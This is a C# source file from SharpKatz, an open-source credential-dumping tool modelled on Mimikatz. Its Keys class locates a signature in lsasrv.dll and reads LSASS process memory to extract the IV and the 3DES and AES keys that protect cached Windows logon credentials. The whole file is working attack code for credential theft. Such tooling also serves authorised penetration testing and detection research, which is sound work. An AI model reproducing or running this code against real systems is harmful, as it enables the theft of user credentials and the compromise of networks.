//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using System;
using System.Runtime.InteropServices;

namespace SharpKatz
{
    internal class Keys
    {
        private byte[] iv;
        private byte[] deskey;
        private byte[] aeskey;

        private static long max_search_size = 580000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_HARD_KEY
        {
            public int cbSecret;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 60)]
            public byte[] data; // etc...
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BCRYPT_KEY81
        {
            private int size;
            private int tag;  // 'MSSK'
            private int type;
            private int unk0;
            private int unk1;
            private int unk2;
            private int unk3;
            private int unk4;
            private IntPtr unk5; // before, align in x64
            private int unk6;
            private int unk7;
            private int unk8;
            private int unk9;
            public KIWI_HARD_KEY hardkey;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BCRYPT_HANDLE_KEY
        {
            public int size;
            public int tag;  // 'UUUR'
            public IntPtr hAlgorithm; //PVOID
            public IntPtr key; //PKIWI_BCRYPT_KEY81
            public IntPtr unk0; //PVOID
        }

        public Keys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
        {
            if (FindKeys(hLsass, lsasrvMem, oshelper) != 0)
            {
                Console.WriteLine("Error retriving keys");
            }
        }

        public byte[] GetIV()
        {
            return iv;
        }

        public byte[] GetDESKey()
        {
            return deskey;
        }

        public byte[] GetAESKey()
        {
            return aeskey;
        }

        private int FindKeys(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper)
        {
            long keySigOffset = 0;
            long ivOffset = 0;
            long desOffset = 0, aesOffset = 0;
            KIWI_BCRYPT_HANDLE_KEY h3DesKey;
            KIWI_BCRYPT_HANDLE_KEY hAesKey;
            KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
            IntPtr keyPointer = IntPtr.Zero;

            // Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
            keySigOffset = (long)Utility.OffsetFromSign("lsasrv.dll", oshelper.keyIVSig, max_search_size);
            if (keySigOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find offset to AES/3Des/IV keys\n");
                return 1;
            }

            // Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
            IntPtr tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.IV_OFFSET);
            byte[] ivOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            ivOffset = BitConverter.ToInt32(ivOffsetBytes, 0);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.IV_OFFSET + 4 + (int)ivOffset);

            // Read InitializationVector (16 bytes)
            this.iv = Utility.ReadFromLsass(ref hLsass, tmp_p, 16);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.DES_OFFSET);

            // Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
            byte[] desOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            desOffset = BitConverter.ToInt32(desOffsetBytes, 0);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.DES_OFFSET + 4 + (int)desOffset);

            // Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
            byte[] keyPointerBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            long keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);

            // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
            byte[] h3DesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
            h3DesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(h3DesKeyBytes);

            // Read in the 3DES key
            byte[] extracted3DesKeyByte = Utility.ReadFromLsass(ref hLsass, h3DesKey.key, Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
            extracted3DesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extracted3DesKeyByte);

            this.deskey = extracted3DesKey.hardkey.data;

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET);

            // Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
            byte[] aesOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            aesOffset = BitConverter.ToUInt32(aesOffsetBytes, 0);

            tmp_p = IntPtr.Add(lsasrvMem, (int)keySigOffset + (int)oshelper.AES_OFFSET + 4 + (int)aesOffset);

            // Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
            keyPointerBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            keyPointerInt = BitConverter.ToInt64(keyPointerBytes, 0);

            // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
            byte[] hAesKeyBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(keyPointerInt), Marshal.SizeOf(typeof(KIWI_BCRYPT_HANDLE_KEY)));
            hAesKey = Utility.ReadStruct<KIWI_BCRYPT_HANDLE_KEY>(hAesKeyBytes);

            // Read in AES key
            byte[] extractedAesKeyBytes = Utility.ReadFromLsass(ref hLsass, hAesKey.key, Marshal.SizeOf(typeof(KIWI_BCRYPT_KEY81)));
            extractedAesKey = Utility.ReadStruct<KIWI_BCRYPT_KEY81>(extractedAesKeyBytes);

            this.aeskey = extractedAesKey.hardkey.data;

            return 0;
        }
    }
}